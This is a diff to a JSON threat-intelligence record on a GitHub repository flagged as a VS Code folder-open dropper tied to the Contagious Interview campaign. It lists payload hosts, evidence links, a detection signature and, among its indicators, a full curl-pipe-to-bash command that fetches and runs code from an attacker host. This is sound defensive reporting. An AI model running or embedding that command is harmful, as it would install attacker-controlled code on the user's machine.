@@ -21,8 +21,8 @@
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 12)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20260925T173032Z",
-    "last_seen": "hunt-20260925T173032Z",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/lfirsl_morphix.json",
     "reviewer_decision": "",
     "notes": ""
@@ -132,7 +132,7 @@
     "report_type": "repository",
     "resource_identifier": "https://github.com/lfirsl/morphix",
     "version_info": "all",
-    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-extension-260120.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-extension-260120.vercel.app.\nCampaign GW-C-498a0aeb: one of 86 confirmed repos across 58 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including 260120.vercel.app, default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-extension-260120.vercel.app.\nFound by GitHub code search for a confirmed malware signature: folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-extension-260120.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-extension-260120.vercel.app.\nCampaign GW-C-498a0aeb: one of 81 confirmed repos across 69 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app, vscode-config-settings.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-extension-260120.vercel.app.\nFound by GitHub code search for a confirmed malware signature: folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
     "payload_description": "Malicious payload found in: .vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from vscode-extension-260120.vercel.app and executes it (.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed\n- Attacker hosts: vscode-extension-260120.vercel.app",
     "publisher": "lfirsl",
     "severity_level": "critical",
@@ -150,7 +150,7 @@
     "evidence_references": "https://github.com/lfirsl/morphix/blob/7d7ad21dfb0a50dc94ea73b847dca368541e71a0/.vscode/tasks.json\nhttps://github.com/lfirsl/morphix/blob/7d7ad21dfb0a50dc94ea73b847dca368541e71a0/.github/workflows/build.yml#L22\nhttps://github.com/lfirsl/morphix/blob/7d7ad21dfb0a50dc94ea73b847dca368541e71a0/morphix_core/gpu_detection.py#L21\nhttps://github.com/lfirsl/morphix/blob/7d7ad21dfb0a50dc94ea73b847dca368541e71a0/morphix_core/gpu_detection.py#L37\nhttps://github.com/lfirsl/morphix/blob/7d7ad21dfb0a50dc94ea73b847dca368541e71a0/morphix_core/gpu_detection.py#L142\nhttps://github.com/lfirsl/morphix/blob/7d7ad21dfb0a50dc94ea73b847dca368541e71a0/morphix_core/ffmpeg_utils.py#L57\nhttps://github.com/lfirsl/morphix/blob/7d7ad21dfb0a50dc94ea73b847dca368541e71a0/morphix_core/ffmpeg_utils.py#L80\nhttps://github.com/lfirsl/morphix/blob/7d7ad21dfb0a50dc94ea73b847dca368541e71a0/morphix_core/ffmpeg_utils.py#L119\nhttps://github.com/lfirsl/morphix/blob/7d7ad21dfb0a50dc94ea73b847dca368541e71a0/morphix_core/ffmpeg_executor.py#L98\nhttps://github.com/lfirsl/morphix/blob/7d7ad21dfb0a50dc94ea73b847dca368541e71a0/morphix_core/ffmpeg_executor.py#L102\nhttps://github.com/lfirsl/morphix/blob/7d7ad21dfb0a50dc94ea73b847dca368541e71a0/morphix_core/ffmpeg_executor.py#L120\nhttps://github.com/lfirsl/morphix/blob/7d7ad21dfb0a50dc94ea73b847dca368541e71a0/morphix_core/ffmpeg_executor.py#L126\nhttps://github.com/lfirsl/morphix/blob/7d7ad21dfb0a50dc94ea73b847dca368541e71a0/morphix_core/cli.py#L25",
     "verified_iocs": "vscode-extension-260120.vercel.app\nhttps://vscode-extension-260120.vercel.app/settings/linux?flag=8-3039\ncurl https://vscode-extension-260120.vercel.app/settings/linux?flag=8-3039 | bash\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-25T17:30:32Z",
-    "last_seen": "2026-09-25T17:30:32Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
